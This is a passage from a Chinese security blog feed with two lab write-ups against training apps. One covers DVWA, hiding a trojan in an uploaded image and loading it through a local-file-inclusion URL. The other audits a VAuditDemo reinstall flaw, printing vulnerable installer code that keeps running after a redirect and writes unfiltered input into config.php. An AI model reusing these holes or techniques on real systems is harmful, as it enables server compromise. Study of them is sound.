$_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];</span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; 100000 ) &amp;&amp; /*判断是否为jpg或jpeg或png的后缀名和文件大小小于100000和获取图像大小，getimagesize()获取图像大小随便还检查了文件头部，如果文件不为图像返回一个False*/</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        // Can we move the file to the upload folder? </span><br><span class="line">        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; /*move_upload_file()如果这是一个合法的文件将其移到新的位置，这里的判断是如果文件不合法*/</span><br><span class="line">            // No </span><br><span class="line">            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // Yes! </span><br><span class="line">            echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Invalid file </span><br><span class="line">        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>使用copy命令将一张图片和马子合在一起<br><img src="https://s2.ax1x.com/2019/01/21/kiUwQ0.png" alt="kiUwQ0.png"></p><p><img src="https://s2.ax1x.com/2019/01/21/kiUgY9.png" alt="kiUgY9.png"></p><p><img src="https://s2.ax1x.com/2019/01/21/kiUHFH.png" alt="kiUHFH.png"><br>本地包含<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=file:///I:\phpstudy\PHPTutorial\WWW\DVWA-master\hackable\uploads\bc.jpg</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/21/kiapTg.png" alt="kiapTg.png"></p><p><img src="https://s2.ax1x.com/2019/01/21/kiaVXV.png" alt="kiaVXV.png"></p><p><img src="https://s2.ax1x.com/2019/01/21/kiaKk4.png" alt="kiaKk4.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vauditdemo reloading vulnerability recurrence</title>
      <link href="/posts/70e2f438.html"/>
      <url>/posts/70e2f438.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>晚上刚回到家，发现不值得老哥发了篇文章给我。我赶紧打开看了一看，叮代码审计+复现，[滑稽]<br>剩下自己脑补发生的事情。附上不值得老哥的文章：<a href="http://www.sariel.top/2019/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/vauditdemo%E9%87%8D%E8%A3%85%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">vauditdemo重装漏洞 复现 | 只因不值得</a><br><img src="https://images.900.tw/upload_file/41/content/18bc0c10-58ea-136a-9bb8-775436fcc920.jpg" alt="18bc0c10-58ea-136a-9bb8-775436fcc920.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先先看主文件，index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">require_once(&apos;sys/config.php&apos;); /*引用sys/config.php*/</span><br><span class="line">require_once(&apos;header.php&apos;); /*引用header.php*/</span><br><span class="line">?&gt;</span><br><span class="line">&lt;div class=&quot;row&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">/* Include */</span><br><span class="line">if (isset($_GET[&apos;module&apos;]))&#123;</span><br><span class="line">include($_GET[&apos;module&apos;].&apos;.inc&apos;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;div class=&quot;jumbotron&quot; style=&quot;text-align: center;&quot;&gt;</span><br><span class="line">&lt;h1&gt;&lt;b&gt;VAuditDemo&lt;/b&gt;&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;一个简单的Web漏洞演练平台&lt;/p&gt;&lt;br /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;col-lg-12&quot;&gt;</span><br><span class="line">&lt;h2&gt;用於演示講解PHP基本漏洞&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">require_once(&apos;footer.php&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>发现开头就引用了config.php和header.php二话不说，跟过去看看，header.php没什么东西看install.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if ( file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;].&apos;/sys/install.lock&apos;) ) &#123; /*判断是否有/sys/install.lock这个文件*/</span><br><span class="line">header( &quot;Location: ../index.php&quot; ); /*关键问题出在这里，跳转到index.php之后没有及时退出，导致下面的代码还能继续运行*/</span><br><span class="line">&#125;</span><br><span class="line">require_once &apos;../header.php&apos;;</span><br><span class="line"></span><br><span class="line">function check_writeable( $file ) &#123;</span><br><span class="line">if ( file_exists( $file ) ) &#123;</span><br><span class="line">if ( is_dir( $file ) ) &#123;</span><br><span class="line">$dir = $file;</span><br><span class="line">if ( $fp = @fopen( &quot;$dir/test.txt&quot;, &apos;w&apos; ) ) &#123;</span><br><span class="line">@fclose( $fp );</span><br><span class="line">@unlink( &quot;$dir/test.txt&quot; );</span><br><span class="line">$writeable = 1;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">$writeable = 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">if ( $fp = @fopen( $file, &apos;a+&apos; ) ) &#123;</span><br><span class="line">@fclose( $fp );</span><br><span class="line">$writeable = 1;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">$writeable = 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">$writeable = 2;</span><br><span class="line">&#125;</span><br><span class="line">return $writeable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sys_info[&apos;mysql_ver&apos;]     = extension_loaded( &apos;mysql&apos; ) ? &apos;OK&apos; : &apos;NO&apos;;</span><br><span class="line">$sys_info[&apos;zlib&apos;]          = function_exists( &apos;gzclose&apos; ) ? &apos;OK&apos; : &apos;NO&apos;;</span><br><span class="line">$sys_info[&apos;gd&apos;]            = extension_loaded( &quot;gd&quot; ) ? &apos;OK&apos; : &apos;NO&apos;;</span><br><span class="line">$sys_info[&apos;socket&apos;]        = function_exists( &apos;fsockopen&apos; ) ? &apos;OK&apos; : &apos;NO&apos;;</span><br><span class="line">$sys_info[&apos;curl_init&apos;]        = function_exists( &apos;curl_init&apos; ) ? &apos;OK&apos; : &apos;NO&apos;;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;div id=&quot;ourhp_er&quot;&gt;&apos;;</span><br><span class="line">echo &apos;&lt;h1&gt;系統環境&lt;/h1&gt;&apos;;</span><br><span class="line">echo &apos;&lt;p&gt;服務器操作系統:&amp;nbsp;....................................................................&amp;nbsp;&apos;.PHP_OS.&apos;&lt;/p&gt;&apos;;</span><br><span class="line">echo &apos;&lt;p&gt;Web 服務器:&amp;nbsp;....................................................&amp;nbsp;&apos;.$_SERVER[&apos;SERVER_SOFTWARE&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">echo &apos;&lt;p&gt;PHP 版本:&amp;nbsp;....................................................................&amp;nbsp;&apos;.PHP_VERSION.&apos;&lt;/p&gt;&apos;;</span><br><span class="line">echo &apos;&lt;p&gt;MySQL 版本:&amp;nbsp;....................................................................&amp;nbsp;&apos;.$sys_info[&apos;mysql_ver&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">echo &apos;&lt;p&gt;Zlib 支持:&amp;nbsp;....................................................................&amp;nbsp;&apos;.$sys_info[&apos;zlib&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">echo &apos;&lt;p&gt;GD2 支持:&amp;nbsp;....................................................................&amp;nbsp;&apos;.$sys_info[&apos;gd&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">echo &apos;&lt;p&gt;Socket 支持:&amp;nbsp;....................................................................&amp;nbsp;&apos;.$sys_info[&apos;socket&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">echo &apos;&lt;p&gt;curl 支持:&amp;nbsp;....................................................................&amp;nbsp;&apos;.$sys_info[&apos;curl_init&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">echo &apos;&lt;h1&gt;目錄權限&lt;/h1&gt;&apos;;</span><br><span class="line"></span><br><span class="line">/* 检查目录 */</span><br><span class="line">$check_dirs = array (</span><br><span class="line">&apos;../sys&apos;,</span><br><span class="line">&apos;../uploads&apos;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$i = 0;</span><br><span class="line">foreach ( $check_dirs as $dir ) &#123;</span><br><span class="line">$full_dir = $dir;</span><br><span class="line">$check_writeable = check_writeable( $full_dir );</span><br><span class="line">if ( $check_writeable == &apos;1&apos; ) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;&quot;.$check_dirs[$i].&quot;&amp;nbsp;...................................................................&amp;nbsp;&lt;font color=&apos;#00CC33&apos;&gt;可寫&lt;/font&gt;&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">elseif ( $check_writeable == &apos;0&apos; ) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;&quot;.$check_dirs[$i].&quot;&amp;nbsp;...................................................................&amp;nbsp;&lt;font color=&apos;#ff0000&apos;&gt;不可寫&lt;/font&gt;&lt;/p&gt;&quot;;</span><br><span class="line">$no_write = true;</span><br><span class="line">&#125;</span><br><span class="line">elseif ( $check_writeable == &apos;2&apos; ) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;&quot;.$check_dirs[$i].&quot;&amp;nbsp;...................................................................&amp;nbsp;&lt;b&gt;不存在&lt;/b&gt;&lt;/p&gt;&quot;;</span><br><span class="line">$no_write = true;</span><br><span class="line">&#125;</span><br><span class="line">$i = $i + 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $sys_info[&apos;gd&apos;] == &apos;NO&apos; || $sys_info[&apos;curl_init&apos;] == &apos;NO&apos; ) &#123;</span><br><span class="line">exit( &apos;組建不支持，無法安裝使用！&apos; );</span><br><span class="line">&#125;else if ( $check_writeable == &apos;0&apos; || $check_writeable == &apos;2&apos; ) &#123;</span><br><span class="line">exit( &apos;關鍵目錄不可寫，無法安裝使用！&apos; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_POST ) &#123;</span><br><span class="line"></span><br><span class="line">if ( $_POST[&quot;dbhost&quot;] == &quot;&quot; ) &#123;</span><br><span class="line">exit( &apos;数据库连接地址不能为空&apos; );</span><br><span class="line">&#125;elseif ( $_POST[&quot;dbuser&quot;] == &quot;&quot; ) &#123;</span><br><span class="line">exit( &apos;数据库数据库登录名&apos; );</span><br><span class="line">&#125;elseif ( $_POST[&quot;dbname&quot;] == &quot;&quot; ) &#123;</span><br><span class="line">exit( &apos;请先创建数据库名称&apos; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dbhost = $_POST[&quot;dbhost&quot;];</span><br><span class="line">$dbuser = $_POST[&quot;dbuser&quot;];</span><br><span class="line">$dbpass = $_POST[&quot;dbpass&quot;];</span><br><span class="line">$dbname = $_POST[&quot;dbname&quot;];</span><br><span class="line"></span><br><span class="line">$con = mysql_connect( $dbhost, $dbuser, $dbpass );</span><br><span class="line">if ( !$con ) &#123;</span><br><span class="line">die( &apos;数据库链接出错，请检查账号密码及地址是否正确: &apos; . mysql_error() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = mysql_query(&apos;show databases;&apos;) or die ( mysql_error() );;</span><br><span class="line">While($row = mysql_fetch_assoc($result))&#123;       </span><br><span class="line">$data[] = $row[&apos;Database&apos;];</span><br><span class="line">&#125;</span><br><span class="line">unset($result, $row);</span><br><span class="line">if (in_array(strtolower($dbname), $data))&#123;</span><br><span class="line">mysql_close();</span><br><span class="line">echo &quot;&lt;script&gt;if(!alert(&apos;數據庫已存在&apos;))&#123;window.history.back(-1);&#125;&lt;/script&gt;&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_query( &quot;CREATE DATABASE $dbname&quot;, $con ) or die ( mysql_error() );</span><br><span class="line"></span><br><span class="line">$str_tmp=&quot;&lt;?php\r\n&quot;;</span><br><span class="line">$str_end=&quot;?&gt;&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;error_reporting(0);\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;if (!file_exists(\$_SERVER[\&quot;DOCUMENT_ROOT\&quot;].&apos;/sys/install.lock&apos;))&#123;\r\n\theader(\&quot;Location: /install/install.php\&quot;);\r\nexit;\r\n&#125;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;include_once(&apos;../sys/lib.php&apos;);\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\$host=\&quot;$dbhost\&quot;; \r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\$username=\&quot;$dbuser\&quot;; \r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\$password=\&quot;$dbpass\&quot;; \r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\$database=\&quot;$dbname\&quot;; \r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\$conn = mysql_connect(\$host,\$username,\$password);\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;mysql_query(&apos;set names utf8&apos;,\$conn);\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;mysql_select_db(\$database, \$conn) or die(mysql_error());\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;if (!\$conn)\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;&#123;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\tdie(&apos;Could not connect: &apos; . mysql_error());\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\texit;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;&#125;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;session_start();\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=$str_end;</span><br><span class="line"></span><br><span class="line">$fp=fopen( &quot;../sys/config.php&quot;, &quot;w&quot; );</span><br><span class="line">fwrite( $fp, $str_tmp );</span><br><span class="line">fclose( $fp );</span><br><span class="line"></span><br><span class="line">//创建表</span><br><span class="line">mysql_select_db( $dbname, $con );</span><br><span class="line">mysql_query( &quot;set names &apos;utf8&apos;&quot;, $con );</span><br><span class="line">//导入数据库</span><br><span class="line">$sql=file_get_contents( &quot;install.sql&quot; );</span><br><span class="line">$a=explode( &quot;;&quot;, $sql );</span><br><span class="line">foreach ( $a as $b ) &#123;</span><br><span class="line">mysql_query( $b.&quot;;&quot; );</span><br><span class="line">&#125;</span><br><span class="line">mysql_close( $con );</span><br><span class="line">file_put_contents($_SERVER[&quot;DOCUMENT_ROOT&quot;].&apos;/sys/install.lock&apos;, &apos;virink&apos;);</span><br><span class="line">echo &quot;&lt;script&gt;if(!alert(&apos;安裝成功&apos;))&#123;window.location.href=&apos;../index.php&apos;;&#125;&lt;/script&gt;&quot;;</span><br><span class="line">exit;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">echo &quot;&lt;form id=&apos;form1&apos; name=&apos;form1&apos; method=&apos;post&apos; action=&apos;&apos;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;table width=&apos;100%&apos; border=&apos;0&apos; align=&apos;center&apos; cellpadding=&apos;10&apos; id=&apos;table&apos;&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td colspan=&apos;2&apos;&gt;&lt;h1&gt;&lt;/h1&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;div align=&apos;right&apos;&gt;數據庫连接地址：&lt;/div&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;input name=&apos;dbhost&apos; type=&apos;text&apos; id=&apos;input&apos; value=&apos;localhost&apos;/&gt; *&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;div align=&apos;right&apos;&gt;數據庫登錄名：&lt;/div&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;input name=&apos;dbuser&apos; type=&apos;text&apos; id=&apos;input&apos; value=&apos;root&apos;/&gt; *&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;div align=&apos;right&apos;&gt;數據庫登錄密碼：&lt;/div&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;input name=&apos;dbpass&apos; type=&apos;password&apos; id=&apos;input&apos; value=&apos;root&apos;/&gt; *&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;div align=&apos;right&apos;&gt;創建數據庫名稱：&lt;/div&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;input name=&apos;dbname&apos; type=&apos;text&apos; id=&apos;input&apos; value=&apos;vauditdemo&apos;/&gt; *&lt;/td&gt; &quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;td&gt;&lt;input type=&apos;submit&apos; class=&apos;btn&apos; name=&apos;Submit&apos; value=&apos;安裝&apos; /&gt;&lt;/td&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/table&gt;&quot;;</span><br><span class="line">echo &quot;&lt;/form&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">require_once &apos;../footer.php&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>关键问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;].&apos;/sys/install.lock&apos;) ) &#123; /*判断是否有/sys/install.lock这个文件*/</span><br><span class="line">header( &quot;Location: ../index.php&quot; ); /*关键问题出在这里，跳转到index.php之后没有及时退出，导致下面的代码还能继续运行*/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后下面也没用过滤请求变量的操作，直接写入数据库了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">$dbhost = $_POST[&quot;dbhost&quot;];</span><br><span class="line">$dbuser = $_POST[&quot;dbuser&quot;];</span><br><span class="line">$dbpass = $_POST[&quot;dbpass&quot;];</span><br><span class="line">$dbname = $_POST[&quot;dbname&quot;];</span><br><span class="line"></span><br><span class="line">$con = mysql_connect( $dbhost, $dbuser, $dbpass );</span><br><span class="line">if ( !$con ) &#123;</span><br><span class="line">die( &apos;数据库链接出错，请检查账号密码及地址是否正确: &apos; . mysql_error() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = mysql_query(&apos;show databases;&apos;) or die ( mysql_error() );; /*直接进行了写入*/</span><br><span class="line">While($row = mysql_fetch_assoc($result))&#123;       </span><br><span class="line">$data[] = $row[&apos;Database&apos;];</span><br><span class="line">&#125;</span><br><span class="line">unset($result, $row);</span><br><span class="line">if (in_array(strtolower($dbname), $data))&#123;</span><br><span class="line">mysql_close();</span><br><span class="line">echo &quot;&lt;script&gt;if(!alert(&apos;數據庫已存在&apos;))&#123;window.history.back(-1);&#125;&lt;/script&gt;&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_query( &quot;CREATE DATABASE $dbname&quot;, $con ) or die ( mysql_error() );</span><br><span class="line"></span><br><span class="line">$str_tmp=&quot;&lt;?php\r\n&quot;;</span><br><span class="line">$str_end=&quot;?&gt;&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;error_reporting(0);\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;\r\n&quot;;</span><br><span class="line">$str_tmp.=&quot;if (!file_exists(\$_SERVER[\&quot;DOCUMENT_ROOT\&quot;].&apos;/sys/install.lock&apos;))&#123;\r\n\theader(\&quot;Location: 